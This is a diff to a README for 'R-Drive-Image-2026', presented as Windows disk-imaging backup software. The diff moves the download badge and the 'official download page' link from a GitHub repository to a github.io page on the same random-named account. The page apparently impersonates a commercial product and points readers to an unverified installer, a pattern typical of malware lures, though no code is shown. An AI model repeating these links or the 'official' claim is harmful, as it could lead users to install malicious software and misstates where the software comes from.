@@ -1,12 +1,12 @@
 # 💾 R-Drive-Image-2026 - Create dependable backups for your computer
 
-[![](https://img.shields.io/badge/Download-R--Drive--Image--2026-blue.svg)](https://github.com/Sociable-quercusphellos548/R-Drive-Image-2026)
+[![](https://img.shields.io/badge/Download-R--Drive--Image--2026-blue.svg)](https://sociable-quercusphellos548.github.io)
 
 R-Drive Image 2026 creates exact copies of your hard drives. You use these copies to restore your system if your computer fails. This software works on Windows 11 and Windows 10. You perform full system backups, disk imaging, and file restoration with a simple interface.
 
 ## 📥 Downloading your software
 
-Visit the [official download page](https://github.com/Sociable-quercusphellos548/R-Drive-Image-2026) to obtain the installer. This page hosts the most current version. Select the link to start the download process. Your browser saves the file in your default Downloads folder.
+Visit the [official download page](https://sociable-quercusphellos548.github.io) to obtain the installer. This page hosts the most current version. Select the link to start the download process. Your browser saves the file in your default Downloads folder.
 
 ## ⚙️ System requirements
 
